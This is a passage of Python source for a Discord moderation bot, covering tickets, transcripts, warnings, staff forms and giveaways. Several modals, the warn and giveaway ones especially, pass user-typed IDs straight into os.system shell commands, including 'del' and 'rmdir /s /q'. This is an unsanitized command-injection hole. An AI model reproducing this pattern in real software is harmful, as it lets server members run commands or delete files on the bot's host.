        async def Verify1(self, interaction: discord.Interaction, button: discord.ui.Button):
            try:
                member = discord.utils.get(interaction.guild.members, id=interaction.user.id)
                botrole = discord.utils.get(guild.roles, id=getroleverifyid)
                if botrole not in member.roles:
                    await member.add_roles(botrole)
                    await interaction.response.send_message(f"I have given you {botrole.mention}!", ephemeral=True)
                else:
                    await interaction.response.send_message(f"You already have the role", ephemeral=True)
            except:
                print("Missing Permissions")


class Ticket(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='〈🔑〉Create Ticket', style=discord.ButtonStyle.blurple, custom_id='bt_view:cticket')
    async def cticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        if ticketnumber == 1:
            await interaction.response.send_message(f"Choose a reason", ephemeral = True, view=ticketselect1())
        if ticketnumber == 2:
            await interaction.response.send_message(f"Choose a reason", ephemeral = True, view=ticketselect2())
        if ticketnumber == 3:
            await interaction.response.send_message(f"Choose a reason", ephemeral = True, view=ticketselect3())
        if ticketnumber == 4:
            await interaction.response.send_message(f"Choose a reason", ephemeral = True, view=ticketselect4())
        if ticketnumber == 5:
            await interaction.response.send_message(f"Choose a reason", ephemeral = True, view=ticketselect5())

class ccTicket(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='〈❌〉Close Ticket', style=discord.ButtonStyle.red, custom_id='bt_view:cticket2')
    async def cticket2(self, interaction: discord.Interaction, button: discord.ui.Button):
        bot.role = interaction.guild.get_role(ticket_staff_rolec)
        if bot.role not in interaction.user.roles:
            await interaction.response.send_message(f"you dont have this role: {bot.role}", ephemeral = True)
        if bot.role in interaction.user.roles:
            try:
                filee = None
                number = 1
                point = f"transcript\\{interaction.channel.name}"
                if os.path.exists(point):
                    for files in os.listdir(point):
                        number += 1
                    channel = interaction.channel
                    messages = channel.history(limit=None)

                    transcript = f'{style}<div class="chat-header">\n    <h1 class="chat-title">{servername}</h1>\n    <p class="chat-description">Channel Name: {interaction.channel.name}\nChannel ID: {interaction.channel.id}</p>\n</div>\n<div class="chat-container">'
                    async for msg in messages:
                        timestamp = msg.created_at.strftime('%Y-%m-%d %H:%M:%S')
                        author = msg.author.name
                        content = msg.content.replace('\n', '<br>')
                        transcript += f'\n    <div class="message">\n        <span class="timestamp">{timestamp} </span>\n        <span class="author">{author}: </span>\n        <div class="content">{content}</div>\n    </div>'

                    transcript += '</body></html>'
                    os.system(f"mkdir {point}\\{number}")
                    with open(f'{point}\\{number}\\transcript.html', 'w', encoding='utf-8') as file:
                        file.write(transcript)
                    with open(f'{point}\\{number}\\transcript.html', 'r', encoding='utf-8') as file:
                        htmltext = file.read()
                        filee = discord.File(f'{point}\\{number}\\transcript.html')
                if not os.path.exists(point):
                    os.system(f"mkdir {point}")
                    channel = interaction.channel
                    messages = channel.history(limit=None)

                    transcript = f'{style}<div class="chat-header">\n    <h1 class="chat-title">{servername}</h1>\n    <p class="chat-description">Channel Name: {interaction.channel.name}\nChannel ID: {interaction.channel.id}</p>\n</div>\n<div class="chat-container">'
                    async for msg in messages:
                        timestamp = msg.created_at.strftime('%Y-%m-%d %H:%M:%S')
                        author = msg.author.name
                        content = msg.content.replace('\n', '<br>')
                        transcript += f'\n    <div class="message">\n        <span class="timestamp">{timestamp} </span>\n        <span class="author">{author}: </span>\n        <div class="content">{content}</div>\n    </div>'

                    transcript += '</body></html>'

                    os.system(f"mkdir {point}\\{number}")
                    with open(f'{point}\\{number}\\transcript.html', 'w', encoding='utf-8') as file:
                        file.write(transcript)
                    with open(f'{point}\\{number}\\transcript.html', 'r', encoding='utf-8') as file:
                        htmltext = file.read()
                        filee = discord.File(f'{point}\\{number}\\transcript.html')
                with open(f'{point}\\{number}\\transcript.txt', 'w', encoding='utf-8') as file:
                    file.write(interaction.channel.topic)
                embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is Closed\n``Information about the user who Closed the ticket\n\nUser Name: {interaction.user.name}#{interaction.user.discriminator}\nUser ID: {interaction.user.id}\nTicket: {interaction.channel}\nClosed Time: {datetime.now()}``**", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                await channel.send(embed=embed, file=filee)
                await interaction.channel.delete()
            except:
                try:
                    embed=discord.Embed(title=f"Ticket System", timestamp=datetime.now(), description=f"**A new ticket is Closed\n``Information about the user who Closed the ticket\n\nUser Name: {interaction.user.name}#{interaction.user.discriminator}\nUser ID: {interaction.user.id}\nTicket: {interaction.channel}\nClosed Time: {datetime.now()}``**", color=colorembed)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    channel = discord.utils.get(guild.channels, name=f"〈📋〉ticketlogs")
                    await channel.send(embed=embed)
                    await interaction.channel.delete()
                except:
                    await interaction.channel.delete()


    @discord.ui.button(label="〈👥〉Add Member", style=discord.ButtonStyle.green, custom_id="ccticket_view:addmember")
    async def addmember(self, interaction: discord.Interaction, button: discord.ui.Button):
        staffrole = discord.utils.get(guild.roles, id=rolestaff)
        if staffrole in interaction.user.roles:
            await interaction.response.send_modal(addmember())
        if staffrole not in interaction.user.roles:
            await interaction.response.send_message(f'You do not have permissions', ephemeral=True)

    @discord.ui.button(label="〈👤〉Delete Member", style=discord.ButtonStyle.green, custom_id="ccticket_view:deletemember")
    async def deletemember(self, interaction: discord.Interaction, button: discord.ui.Button):
        staffrole = discord.utils.get(guild.roles, id=rolestaff)
        if staffrole in interaction.user.roles:
            await interaction.response.send_modal(deletemember())
        if staffrole not in interaction.user.roles:
            await interaction.response.send_message(f'You do not have permissions', ephemeral=True)

    

    @discord.ui.button(label="〈👏〉Rename", style=discord.ButtonStyle.blurple, custom_id="ccticket_view:rename")
    async def rename(self, interaction: discord.Interaction, button: discord.ui.Button):
        staffrole = discord.utils.get(guild.roles, id=rolestaff)
        if staffrole in interaction.user.roles:
            await interaction.response.send_modal(rename())
        if staffrole not in interaction.user.roles:
            await interaction.response.send_message(f'You do not have permissions', ephemeral=True)


    if claimtop5 == "true":
        @discord.ui.button(label="〈📩〉Claim", style=discord.ButtonStyle.blurple, custom_id="ccticket_view:claim")
        async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
            channel = guild.get_channel(interaction.channel.id)
            memberr = guild.get_member(interaction.user.id)
            staffrole = discord.utils.get(guild.roles, id=rolestaff)
            if staffrole in memberr.roles:
                po = f"systems\\ticket"
                if channel.permissions_for(staffrole).send_messages:
                    await interaction.response.send_message(f'operation completed', ephemeral=True)
                    if os.path.exists(f"{po}\\claims\\{memberr.id}.txt"):
                        f = open(f"{po}\\claims\\{memberr.id}.txt", "r")
                        file = int(f.read())
                        f.close()
                        file += 1
                        file = str(file)
                        f = open(f"{po}\\claims\\{memberr.id}.txt", "w")
                        f.write(f"{file}")
                        f.close()
                    if not os.path.exists(f"{po}\\claims\\{memberr.id}.txt"):
                        f = open(f"{po}\\claims\\{memberr.id}.txt", "w")
                        f.write(f"1")
                        f.close()
                    try:
                        await channel.set_permissions(staffrole, read_messages=True, send_messages=False)
                        await channel.set_permissions(memberr, read_messages=True, send_messages=True)
                        embed = discord.Embed(title=f"Ticket Claimed By {memberr.name}#{memberr.discriminator}", timestamp=datetime.now(), description="", color=discord.Colour.random())
                        await channel.send(embed=embed)
                    except:
                        print(f"{Fore.LIGHTYELLOW_EX}discord.errors.NotFound: 404 Not Found (error code: 10003): Unknown Channel{Fore.WHITE}")
                else:
                    await interaction.response.send_message(f'You already control the ticket', ephemeral=True)
            if staffrole not in memberr.roles:
                await interaction.response.send_message(f'You do not have permissions', ephemeral=True)



@tasks.loop()
async def topclaims(seconds=4):
    await asyncio.sleep(43200)
    po = f"systems\\ticket"
    number = 0
    embed=discord.Embed(title="Top 5 Claims", description="**The top 5 staff members, who claimed most tickets**", color=0x00ff89)
    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
    embed.set_thumbnail(url=f"{servericon}")
    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
    directory = f'{po}\\claims'
    data = []

    for filename in os.listdir(directory):
        if os.path.isfile(os.path.join(directory + "\\", filename)):
            with open(os.path.join(directory + "\\", filename), 'r') as file:
                numbers = [int(line.strip()) for line in file]
                max_num = max(numbers)

            data.append((filename, max_num))


    data.sort(key=lambda x: x[1], reverse=True)

    for filename, max_num in data[:5]:
        number += 1
        number = str(number)
        username = filename.split('.')[0]
        member = guild.get_member(int(username))
        if member is not None:
            if number == "1" or number == 1:
                embed.add_field(name=f"Top #{number}", value=f"``🥇`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
            elif number == "2" or number == 2:
                embed.add_field(name=f"Top #{number}", value=f"``🥈`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
            elif number == "3" or number == 3:
                embed.add_field(name=f"Top #{number}", value=f"``🥉`` **{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
            else:
                embed.add_field(name=f"Top #{number}", value=f"``{number}. ``**{member.mention}** - ``{max_num} Ticket(s)``", inline=False)
        number = int(number)
        try:
            await claims.edit(embed=embed)
        except:
            print(f"{Fore.LIGHTYELLOW_EX}discord.errors.NotFound: 404 Not Found (error code: 10003): Unknown Channel{Fore.WHITE}")

#inputbox____________________________________________________________________________________________________________________


class rename(ui.Modal, title='Changing the name of the ticket'):
    name = ui.TextInput(label="New name")
    

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.channel.edit(name=f"{self.name}")
        await interaction.response.send_message(f'The name change was successful', ephemeral=True)



class addmember(ui.Modal, title='Add a Member to the Ticket'):
    memberid = ui.TextInput(label="Member ID")
    

    async def on_submit(self, interaction: discord.Interaction):
        f = open("memberid.txt", "w")
        f.write(f"{self.memberid}")
        f.close()
        f = open("memberid.txt", "r")
        memberid = int(f.read())
        f.close()
        os.system("del memberid.txt")
        member = guild.get_member(memberid)
        channel = discord.utils.get(guild.channels, id=interaction.channel.id)
        await channel.set_permissions(member, read_messages=True, send_messages=True)
        embed=discord.Embed(title="Add Member", timestamp=datetime.now(), description=f"**{member.mention} Added To Ticket**", color=colorembed)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await interaction.channel.send(embed=embed)
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)

class deletemember(ui.Modal, title='Delete a Member to the Ticket'):
    memberid = ui.TextInput(label="Member ID")
    

    async def on_submit(self, interaction: discord.Interaction):
        f = open("memberid.txt", "w")
        f.write(f"{self.memberid}")
        f.close()
        f = open("memberid.txt", "r")
        memberid = int(f.read())
        f.close()
        os.system("del memberid.txt")
        member = guild.get_member(memberid)
        channel = discord.utils.get(guild.channels, id=interaction.channel.id)
        await channel.set_permissions(member, read_messages=False, send_messages=False)
        embed=discord.Embed(title="Remove Member", timestamp=datetime.now(), description=f"**{member.mention} Removed from the ticket**", color=colorembed)
        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        embed.set_thumbnail(url=f"{servericon}")
        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        await interaction.channel.send(embed=embed)
        await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)


class staff(ui.Modal, title='staff forms'):
    stname = ui.TextInput(label='First Name')
    stage = ui.TextInput(label='Age')
    sttime = ui.TextInput(label="Time on Server")
    stst = ui.TextInput(label="Previous Server Experience")
    stforms = ui.TextInput(label='About Me', style=discord.TextStyle.paragraph)
    

    async def on_submit(self, interaction: discord.Interaction):
        if os.path.exists(f"systems\\staff-forms\\staff-forms\\list\\{interaction.user.id}"):
            await interaction.response.send_message(f'You have already submitted forms', ephemeral=True)
        if not os.path.exists(f"systems\\staff-forms\\staff-forms\\list\\{interaction.user.id}"):
            embed=discord.Embed(title=f"**〈📕〉Staff forms**", description=f"``User Info:\nUser Name {interaction.user.name}#{interaction.user.discriminator}\nUser ID: {interaction.user.id}\nUser join the server: {interaction.user.joined_at}``", color=0x00ffc0)
            embed.add_field(name=f"basic information", value=f"``name: {self.stname}\nage: {self.stage}``", inline=True)
            embed.add_field(name=f"advanced information", value=f"``investment time: {self.sttime}\nprevious servers: {self.stst}``", inline=True)
            embed.add_field(name=f"Tell us a little about yourself", value=f"``{self.stforms}``", inline=False)
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embed.set_thumbnail(url=f"{servericon}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            channel = discord.utils.get(guild.channels, name="〈📂〉staff-forms-logs")
            if channel:
                pass
            if not channel:
                channel = await guild.create_text_channel(name="〈📂〉staff-forms-logs", category=categorylogss)
                await channel.set_permissions(guild.default_role, view_channel=False, send_messages=False)
            channel = discord.utils.get(guild.channels, name="〈📂〉staff-forms-logs")
            os.system(f"echo > systems\\staff-forms\\staff-forms\\list\\{interaction.user.id}")
            await channel.send(embed=embed)
            await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)
    

class rrrwarn(ui.Modal, title='Remove Warn'):
    memberid = ui.TextInput(label='Member ID', )
    warnid = ui.TextInput(label='Warn ID')
    

    async def on_submit(self, interaction: discord.Interaction):
        if not os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.memberid}\\{self.warnid}.txt"):
            await interaction.response.send_message(f'Warn is not exists', ephemeral=True)
        if os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.memberid}\\{self.warnid}.txt"):
            os.system(f"del systems\\Adminpanel\\warnlist\\warns\\{self.memberid}\\{self.warnid}.txt")
            await interaction.response.send_message(f'Thanks for your response!', ephemeral=True)


class cwarn(ui.Modal, title='Checkwarns Panel'):
    wmember = ui.TextInput(label="Member ID")


    async def on_submit(self, interaction: discord.Interaction):
        try:
            channel = open("1.txt", "w")
            channel.write(f"{self.wmember}")
            channel.close()
            channel = open("1.txt", "r")
            member1 = int(channel.read())
            channel.close()
            os.system("del 1.txt")
            memberr = discord.utils.get(guild.members, id=member1)
            if os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{memberr.id}"):
                folder_path = f'systems\\Adminpanel\\warnlist\\warns\\{memberr.id}'
                text_files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
                num_text_files = len(text_files)
                embed=discord.Embed(title=f"**{memberr.name} Warns!**", description=f"``User Info:\nUser Name {memberr.name}#{memberr.discriminator}\nUser ID: {memberr.id}\nUser join the server: {memberr.joined_at}\nUser Warns: {num_text_files}``", color=colorembed)
                embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                embed.set_thumbnail(url=f"{servericon}")
                embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                number = 1
                for filename in os.listdir(folder_path):
                    if filename.endswith(".txt"):
                        with open(os.path.join(folder_path, filename), 'r', encoding="cp1255") as f:
                            text = f.read()
                            embed.add_field(name=f"warns Reasons ({number})", value=f"``{text}``", inline=False)
                            number += 1
                            f.close()
                await interaction.response.send_message(embed=embed, ephemeral=True)
            if not os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{memberr.id}"):
                await interaction.response.send_message("member has no warnings", ephemeral=True)
        except:
            await interaction.response.send_message(f"Error", ephemeral=True)

        

class addwarn(ui.Modal, title='ADDwarn Panel'):
    wid = ui.TextInput(label='warnID')
    wmember = ui.TextInput(label='member who receives the warning (ID)')
    wreason = ui.TextInput(label='warn Reason', style=discord.TextStyle.paragraph)
    

    async def on_submit(self, interaction: discord.Interaction):
        try:
            channel = open("1.txt", "w", encoding="cp1255")
            channel.write(f"{self.wmember}")
            channel.close()
            channel = open("1.txt", "r", encoding="cp1255")
            member1 = int(channel.read())
            channel.close()
            os.system("del 1.txt")
            memberr = discord.utils.get(guild.members, id=member1)
            if os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}"):
                if os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt"):
                    await interaction.response.send_message("The warning with this ID exists", ephemeral=True)
                if not os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt"):
                    os.system(f"echo > systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt")
                    addwarn = open(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt", "w", encoding="cp1255")
                    addwarn.write(f"warn By: {interaction.user.name}#{interaction.user.discriminator}\nWarn ID: {self.wid}\nreason: {self.wreason}")
                    addwarn.close()
                    await interaction.response.send_message(f"{memberr.name} Get warn By {interaction.user.name}", ephemeral=True)

            if not os.path.exists(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}"):
                os.system(f"mkdir systems\\Adminpanel\\warnlist\\warns\\{self.wmember}")
                os.system(f"echo > systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt")
                addwarn = open(f"systems\\Adminpanel\\warnlist\\warns\\{self.wmember}\\{self.wid}.txt", "w", encoding="cp1255")
                addwarn.write(f"Warn By: {interaction.user.name}#{interaction.user.discriminator}\nWarn ID: {self.wid}\nReason: {self.wreason}")
                addwarn.close()
                await interaction.response.send_message(f"{memberr.name} Get warn By {interaction.user.name}", ephemeral=True)
        except:
            await interaction.response.send_message(f"Error", ephemeral=True)

"""
class cbackup(ui.Modal, title='CreateBackup Panel'):
    Backupid = ui.TextInput(label="Backup ID")


    async def on_submit(self, interaction: discord.Interaction):
        pass
"""

#inputbox____________________________________________________________________________________________________________________

class Bt(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='〈📡〉Restart Server', style=discord.ButtonStyle.green, custom_id='bt_view:grey1')
    async def grey1(self, interaction: discord.Interaction, button: discord.ui.Button):
                role = discord.utils.get(guild.roles, name="〈📡〉Panel Permission")
                if role in interaction.user.roles:
                    await interaction.response.send_message('Server is Restart  :white_check_mark: ', ephemeral=True)
                if role not in interaction.user.roles:
                    await interaction.response.send_message('role is not in interaction.user.roles  :x: ', ephemeral=True)


    @discord.ui.button(label='〈📡〉Start Server', style=discord.ButtonStyle.green, custom_id='bt_view:red')
    async def red(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(guild.roles, name="〈📡〉Panel Permission")
        if role in interaction.user.roles:
            await interaction.response.send_message('Server is Started  :white_check_mark: ', ephemeral=True)
        if role not in interaction.user.roles:
            await interaction.response.send_message('role is not in interaction.user.roles  :x: ', ephemeral=True)


    @discord.ui.button(label='〈📡〉Shutdown Server', style=discord.ButtonStyle.green, custom_id='bt_view:green')
    async def green(self, interaction: discord.Interaction, button: discord.ui.Button):
        role = discord.utils.get(guild.roles, name="〈📡〉Panel Permission")
        if role in interaction.user.roles:
            await interaction.response.send_message('Server is Shutdown  :white_check_mark: ', ephemeral=True)
        if role not in interaction.user.roles:
            await interaction.response.send_message('role is not in interaction.user.roles  :x: ', ephemeral=True)

#________________________________________________________________________________________________________________



#Giveaway Class ------------------------------------------------------------------

class startgiveawayt(ui.Modal, title='giveaway Response'):
    giveawayname = ui.TextInput(label='Giveaway Item')
    giveawaydas = ui.TextInput(label='Giveaway Description', style=discord.TextStyle.paragraph)
    giveawaywinner = ui.TextInput(label='The number of winners')
    giveawaych = ui.TextInput(label='The ID of the Channel')
    giveawayID = ui.TextInput(label='The ID of the Giveaway')

    async def on_submit(self, interaction: discord.Interaction):
        os.system(f"mkdir systems\\giveaways\\giveaways\\{self.giveawayID}")
        pointg = f"systems\\giveaways\\giveaways\\{self.giveawayID}"
        os.system(f"mkdir {pointg}\\list")
        f = open(f"{pointg}\\channel.txt", "w")
        f.write(f"{self.giveawaych}")
        f.close()
        f = open(f"{pointg}\\channel.txt", "r")
        channel = int(f.read())
        f.close()
        channelgg = guild.get_channel(channel)
        giveawayembed=discord.Embed(title=f"〈🎉〉Giveaway {self.giveawayname}", timestamp=datetime.now(), description=f"``{self.giveawaydas}``", color=0x00ffa5)
        giveawayembed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
        giveawayembed.set_thumbnail(url=f"{servericon}")
        giveawayembed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
        giveawaymsg = await channelgg.send(embed=giveawayembed, view=Give())
        f = open(f"{pointg}\\name.txt", "w", encoding="utf-8")
        f.write(f"{self.giveawayname}")
        f.close()
        f = open(f"{pointg}\\des.txt", "w", encoding="utf-8")
        f.write(f"{self.giveawaydas}")
        f.close()
        f = open(f"{pointg}\\winners.txt", "w", encoding="utf-8")
        f.write(f"{self.giveawaywinner}")
        f.close()
        f = open(f"{pointg}\\giveawaymsgid.txt", "w", encoding="utf-8")
        f.write(f"{giveawaymsg.id}")
        f.close()
        await interaction.response.send_message("giveaway Started", ephemeral=True)


class Give(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label="〈🎉〉Giveaway", style=discord.ButtonStyle.blurple, custom_id="Give_view:give")
    async def give(self, interaction: discord.Interaction, button: discord.ui.Button):
        pointg = f"systems\\giveaways\\giveaways"
        for files in os.listdir(f"{pointg}"):
            f = open(f"{pointg}\\{files}\\giveawaymsgid.txt", "r")
            msgid = int(f.read())
            f.close()
            if msgid == interaction.message.id:
                point = f"{pointg}\\{files}"
                if os.path.exists(f"{pointg}\\{files}\\list\\{interaction.user.id}"):
                    await interaction.response.send_message("You are already in the lottery", ephemeral=True)
                else:
                    os.system(f"echo > {pointg}\\{files}\\list\\{interaction.user.id}")
                    number = 0
                    for numbers in os.listdir(f"{pointg}\\{files}\\list"):
                        number += 1
                    f = open(f"{point}\\name.txt", "r", encoding="utf-8")
                    gname = f.read()
                    f.close()
                    f = open(f"{point}\\des.txt", "r", encoding="utf-8")
                    gdes = f.read()
                    f.close()
                    f = open(f"{point}\\winners.txt", "r", encoding="utf-8")
                    gwinners = f.read()
                    f.close()
                    giveawayembed=discord.Embed(title=f"〈🎉〉Giveaway {gname}", timestamp=datetime.now(), description=f"``{gdes}``", color=0x00ffa5)
                    giveawayembed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    giveawayembed.add_field(name=f"Members in Giveaway:", value=f"``{number}``", inline=True)
                    giveawayembed.add_field(name=f"Winners:", value=f"``{gwinners}``", inline=True)
                    giveawayembed.set_thumbnail(url=f"{servericon}")
                    giveawayembed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await interaction.message.edit(embed=giveawayembed, view=Give())
                    await interaction.response.send_message("You joined the lottery", ephemeral=True)
                break
        



    @discord.ui.button(label="〈🎉〉finish the Giveaway", style=discord.ButtonStyle.green, custom_id="Give_view:reroll")
    async def reroll(self, interaction: discord.Interaction, button: discord.ui.Button):
        roleget = discord.utils.get(guild.roles, name="〈🎉〉Giveaway Host")
        if roleget in interaction.user.roles:
            pointg = f"systems\\giveaways\\giveaways"
            for files in os.listdir(f"{pointg}"):
                f = open(f"{pointg}\\{files}\\giveawaymsgid.txt", "r")
                msgid = int(f.read())
                f.close()
                if msgid == interaction.message.id:
                    point = f"{pointg}\\{files}"
                    f = open(f"{point}\\winners.txt", "r")
                    gwinners = int(f.read())
                    f.close()
                    nig = 0
                    for loops in os.listdir(f"{pointg}\\{files}\\list"):
                        nig += 1
                    if nig > gwinners or nig == gwinners:
                        embed = discord.Embed(title="〈🎉〉The lottery is over", description=f"**The lottery is over By\nUser: {interaction.user.mention}\nUser Name:** ``{interaction.user.name}``\n**User ID:** ``{interaction.user.id}``\n**Winners:** ``{gwinners}``", color=discord.Colour.random())
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        number = 0
                        for i in range(gwinners):
                            winnersg = os.listdir(f"{pointg}\\{files}\\list")
                            random_file = random.choice(winnersg)
                            number += 1
                            mu = int(random_file)
                            member = guild.get_member(mu)
                            embed.add_field(name=f"Winner ({number})", value=f"**User:** {member.mention}", inline=True)
                            os.system(f"del {pointg}\\{files}\\list\\{random_file}")
                        f = open(f"{pointg}\\{files}\\channel.txt", "r")
                        channelget = int(f.read())
                        f.close()
                        channelgiveaway = guild.get_channel(channelget)
                        await channelgiveaway.send(embed=embed)
                        number = 0
                        for numbers in os.listdir(f"{pointg}\\{files}\\list"):
                            number += 1
                        f = open(f"{point}\\name.txt", "r", encoding="utf-8")
                        gname = f.read()
                        f.close()
                        f = open(f"{point}\\des.txt", "r", encoding="utf-8")
                        gdes = f.read()
                        f.close()
                        f = open(f"{point}\\winners.txt", "r", encoding="utf-8")
                        gwinners = f.read()
                        f.close()
                        giveawayembed=discord.Embed(title=f"〈🎉〉Giveaway {gname}", timestamp=datetime.now(), description=f"``{gdes}``", color=0x00ffa5)
                        giveawayembed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        giveawayembed.add_field(name=f"Members in Giveaway:", value=f"``{number}``", inline=True)
                        giveawayembed.add_field(name=f"Winners:", value=f"``{gwinners}``", inline=True)
                        giveawayembed.set_thumbnail(url=f"{servericon}")
                        giveawayembed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await interaction.message.edit(embed=giveawayembed, view=Give())
                        await interaction.response.send_message("giveaway finished", ephemeral=True)
                    else:
                        await interaction.response.send_message("No one entered the lottery or it didn't start", ephemeral=True)
                else:
                    pass
        if roleget not in interaction.user.roles:
            await interaction.response.send_message(f"You don't have permission you need this role: {roleget.mention}", ephemeral=True)




class delgiveaway(ui.Modal, title='giveaway Response'):
    giveawayIDD = ui.TextInput(label='The ID of the Giveaway')

    async def on_submit(self, interaction: discord.Interaction):
        pointg = f"systems\\giveaways\\giveaways"
        if not os.path.exists(f"{pointg}\\{self.giveawayIDD}"):
            await interaction.response.send_message(f"The lottery ID does not exist", ephemeral=True)
        if os.path.exists(f"{pointg}\\{self.giveawayIDD}"):
            os.system(f"rmdir /s /q {pointg}\\{self.giveawayIDD}")
            await interaction.response.send_message(f"The lottery has been definitively removed", ephemeral=True)


try:
    class Giveawaya(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)

        @discord.ui.button(label=f"〈🎉〉Create Giveaway", style=discord.ButtonStyle.green, custom_id="Giveawaya_view:giveaway2")
        async def giveaway2(self, interaction: discord.Interaction, button: discord.ui.Button):
            roleget = discord.utils.get(guild.roles, name="〈🎉〉Giveaway Host")
            if roleget in interaction.user.roles:
                await interaction.response.send_modal(startgiveawayt()) 
            if roleget not in interaction.user.roles:
                await interaction.response.send_message(f"You don't have permission you Need {roleget.mention}", ephemeral=True)

        
        @discord.ui.button(label="〈🎉〉Delete Giveaway", style=discord.ButtonStyle.red, custom_id="Give_view:rerolld")
        async def rerolld(self, interaction: discord.Interaction, button: discord.ui.Button):
            roleget = discord.utils.get(guild.roles, name="〈🎉〉Giveaway Host")
            if roleget in interaction.user.roles:
                await interaction.response.send_modal(delgiveaway())
            if roleget not in interaction.user.roles:
                await interaction.response.send_message(f"You don't have permission you need this role: {roleget.mention}", ephemeral=True)
except:
    pass




#Giveaway Class ------------------------------------------------------------------

#welcome system ----------------------------------------------------------------------
memberleave = open("systems\\welcome\\emember-leave.txt", "r")
memberleavem = memberleave.read()
memberleave.close()
try:
    cmemberleave = open("systems\\welcome\\mlchannelid.txt", "r")
    mmemberleaves = int(cmemberleave.read())
    cmemberleave.close()
except:
    pass
Antikickmemberslimit = open("systems\\security\\limit\\Antikickmembers.txt", "r")
Antikickmemberslimitm = int(Antikickmemberslimit.read())
Antikickmemberslimit.close()
@bot.event
async def on_member_remove(member):
    guild = member.guild
    if memberleavem == "true":
        if member.guild.id == guildid:
            channel = discord.utils.get(guild.channels, id=mmemberleaves)
            embed = discord.Embed(timestamp=datetime.now(), title=f'{member.name}#{member.discriminator} | Member Leave The Server {member.guild.name}', description=f'{member.mention} Leave to {member.guild.name}!\nYou are the {len(member.guild.members)} Member', color=colorembed)
            embed.set_author(name=f"{member.name}#{member.discriminator}", icon_url=member.avatar)
            embed.set_thumbnail(url=member.avatar)
            embed.set_image(url=servericon)
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await channel.send(embed=embed)
        if member.guild.id != guildid:
            return
    if activity_system == "true":
        guild = bot.get_guild(guildid)
        activity = discord.Activity(type=discord.ActivityType.playing, name=f"Members: 👥 {guild.member_count} Developer Lmao4745")
        await bot.change_presence(activity=activity)
#Anti Kick Members-----------------------------------------------------------
    if os.path.exists(f"{secupdate}esecurity\\Antikickmembers.txt"):
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick, oldest_first=False):
            time_diff = (datetime.now(timezone.utc) - entry.created_at).total_seconds()
            if time_diff <= 5:
                user = entry.user
                if user.id == bot.user.id:
                    return
                if not user.id == bot.user.id:
                    if banlist == "true":
                        if not os.path.exists(f"systems\\Adminpanel\\banlist\\{user.id}"):
                            async for ban in guild.bans():
                                if ban.user.id == member.id:
                                    break
                                if ban.user.id != member.id:
                                    if entry.target == member:
                                        if os.path.exists(f"systems\\security\\Permissions\\KickMembersperm\\{user.id}.txt"):
                                            embed = discord.Embed(title="〈🔨〉Security Logs Kick Members", description=f"**The security system detected an attempt to Kick Members**", color=colorembed)
